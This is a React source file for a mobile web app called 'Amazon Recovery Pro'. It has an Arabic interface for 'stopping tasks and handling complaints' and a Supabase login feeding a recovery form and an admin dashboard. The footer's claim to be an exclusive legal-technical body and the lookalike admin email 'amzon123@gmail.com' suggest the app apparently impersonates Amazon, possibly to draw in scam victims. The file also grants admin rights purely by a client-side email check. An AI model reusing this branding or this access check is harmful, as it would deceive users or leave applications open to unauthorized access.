
import React, { useState, useEffect } from 'react';
import Header from './components/Header.tsx';
import RecoveryForm from './components/RecoveryForm.tsx';
import LiveStatus from './components/LiveStatus.tsx';
import BottomNav from './components/BottomNav.tsx';
import Auth from './components/Auth.tsx';
import AdminDashboard from './components/AdminDashboard.tsx';
import { supabase, isConfigured } from './lib/supabase.ts';
import { AlertCircle, ExternalLink } from 'lucide-react';

const App: React.FC = () => {
  const [activeTab, setActiveTab] = useState('Home');
  const [session, setSession] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);

  useEffect(() => {
    if (!isConfigured) {
      setLoading(false);
      return;
    }

    const checkSession = async () => {
      try {
        const { data } = await supabase.auth.getSession();
        const user = data?.session?.user;
        setSession(data?.session || null);
        
        if (user?.email === 'amzon123@gmail.com') {
          setIsAdmin(true);
          setActiveTab('Admin');
        }
      } catch (err) {
        console.error('Supabase auth error:', err);
        setSession(null);
      } finally {
        setLoading(false);
      }
    };

    checkSession();

    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      setSession(session);
      if (session?.user?.email === 'amzon123@gmail.com') {
        setIsAdmin(true);
        setActiveTab('Admin');
      } else {
        setIsAdmin(false);
      }
    });

    return () => subscription.unsubscribe();
  }, []);

  if (!isConfigured) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9] p-6 text-center" dir="rtl">
        <div className="bg-white p-8 rounded-[40px] shadow-2xl max-w-sm border border-orange-100">
          <div className="w-16 h-16 bg-orange-100 text-orange-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
            <AlertCircle size={40} />
          </div>
          <h2 className="text-xl font-black text-gray-800 mb-4">بانتظار مفاتيح الربط!</h2>
          <p className="text-gray-500 text-sm mb-6 leading-relaxed">يرجى ضبط Supabase للبدء.</p>
        </div>
      </div>
    );
  }

  if (loading) return (
    <div className="min-h-screen flex items-center justify-center bg-[#F4F7F9]">
      <div className="w-12 h-12 border-4 border-[#9B4A4E] border-t-transparent rounded-full animate-spin"></div>
    </div>
  );

  if (!session) return <Auth />;

  return (
    <div className="flex flex-col min-h-screen max-w-[430px] mx-auto bg-[#F4F7F9] relative pb-24">
      <Header />
      
      <main className="flex-1 px-4 py-2">
        {activeTab === 'Admin' && isAdmin ? (
          <AdminDashboard />
        ) : (
          <>
            <LiveStatus />
            <div className="mt-2">
               <div className="flex items-center gap-2 mb-3 px-1">
                  <div className="w-1.5 h-6 bg-[#9B4A4E] rounded-full"></div>
                  <h3 className="text-gray-800 font-bold text-lg text-right w-full">مركز إيقاف المهام ومعالجة الشكاوي</h3>
               </div>
               <RecoveryForm />
            </div>
          </>
        )}

        <div className="mt-6 px-4 text-center">
          <p className="text-[10px] text-gray-400 font-medium leading-relaxed">
            Amazon Recovery Pro هي جهة قانونية تقنية مختصة حصرياً.
          </p>
        </div>
      </main>

      <BottomNav activeTab={activeTab} onTabChange={setActiveTab} isAdmin={isAdmin} />
    </div>
  );
};

export default App;
